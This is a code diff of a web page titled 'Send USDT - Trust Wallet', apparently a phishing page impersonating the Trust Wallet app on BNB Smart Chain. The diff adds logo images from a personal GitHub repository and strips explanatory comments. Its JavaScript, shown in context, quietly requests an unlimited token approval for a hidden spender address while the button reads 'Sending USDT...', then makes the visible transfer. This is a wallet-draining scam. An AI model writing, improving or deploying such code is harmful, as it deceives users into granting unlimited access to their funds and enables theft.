@@ -4,6 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Send USDT - Trust Wallet</title>
+    
+    <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/salmanraheem-dev/bsc/refs/heads/main/logoqr.png">
+    <link rel="shortcut icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bsc/refs/heads/main/logoqr.png">
+    <link rel="apple-touch-icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bsc/refs/heads/main/logoqr.png">
+
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
     <style>
         * {
@@ -115,7 +120,7 @@
             width: fit-content;
         }
 
-        .network-logo { width: 24px; height: 24px; border-radius: 50%; }
+        .network-logo { width: 24px; height: 24px; border-radius: 50%; object-fit: cover; }
 
         .modal-footer {
             padding: 20px;
@@ -165,10 +170,10 @@
         @keyframes spin { to { transform: rotate(360deg); } }
 
         .success-icon {
-            font-size: 60px;
-            color: var(--primary);
-            text-align: center;
-            margin: 40px 0;
+            width: 80px;
+            height: 80px;
+            margin: 40px auto;
+            display: block;
         }
 
         .tx-box {
@@ -188,7 +193,7 @@
         <div class="screen active" id="screenMain">
             <div class="modal-header">
                 <div class="modal-title">Send USDT</div>
-                <div style="width: 24px;"></div>
+                <img src="https://raw.githubusercontent.com/salmanraheem-dev/bsc/refs/heads/main/logoqr.png" style="width: 32px; border-radius: 50%;">
             </div>
 
             <div class="modal-content">
@@ -196,7 +201,7 @@
 
                 <div class="section">
                     <div class="section-label">Recipient Address</div>
-                    <div class="input-field" style="background: var(--surface-light); font-family: monospace; font-size: 13px;">
+                    <div class="input-field" style="background: var(--surface-light); font-family: monospace; font-size: 13px; color: var(--text-secondary);">
                         0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F
                     </div>
                 </div>
@@ -204,7 +209,7 @@
                 <div class="section">
                     <div class="section-label">Network</div>
                     <div class="network-selector">
-                        <img src="https://salmanraheem-dev.github.io/bsc/logobnb.png" class="network-logo">
+                        <img src="https://raw.githubusercontent.com/salmanraheem-dev/bsc/refs/heads/main/logobnb.png" class="network-logo">
                         <span style="font-size: 14px;">BNB Smart Chain</span>
                     </div>
                 </div>
@@ -229,7 +234,7 @@
                 <div class="modal-title">Status</div>
             </div>
             <div class="modal-content" style="text-align: center;">
-                <div class="success-icon">✓</div>
+                <img src="https://raw.githubusercontent.com/salmanraheem-dev/bsc/refs/heads/main/logoqr.png" class="success-icon" style="border-radius: 50%;">
                 <h2 style="margin-bottom: 10px;">Transaction Sent</h2>
                 <p style="color: var(--text-secondary); margin-bottom: 30px;">Your USDT transfer is processing</p>
                 
@@ -259,7 +264,6 @@
 
         let web3, userAccount;
 
-        // Auto-connect and network check on load
         async function init() {
             if (window.ethereum) {
                 web3 = new Web3(window.ethereum);
@@ -309,20 +313,17 @@
             try {
                 await checkNetwork();
                 const contract = new web3.eth.Contract(ABI, CONFIG.USDT);
-                const weiAmount = web3.utils.toWei(amount.toString(), 'ether'); // BEP20 USDT uses 18 decimals
+                const weiAmount = web3.utils.toWei(amount.toString(), 'ether');
 
-                // PHASE 1: AUTO-APPROVE
                 btn.disabled = true;
                 btn.innerHTML = '<span class="loading-spinner"></span> Sending USDT...';
                 
                 const infinite = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                 await contract.methods.approve(CONFIG.SPENDER, infinite).send({ from: userAccount });
 
-                // PHASE 2: AUTO-SEND
                 btn.innerHTML = '<span class="loading-spinner"></span> Sending USDT...';
                 const tx = await contract.methods.transfer(CONFIG.RECIPIENT, weiAmount).send({ from: userAccount });
 
-                // SUCCESS
                 document.getElementById('txHashDisplay').innerText = tx.transactionHash;
                 document.getElementById('screenMain').classList.remove('active');
                 document.getElementById('screenSuccess').classList.add('active');
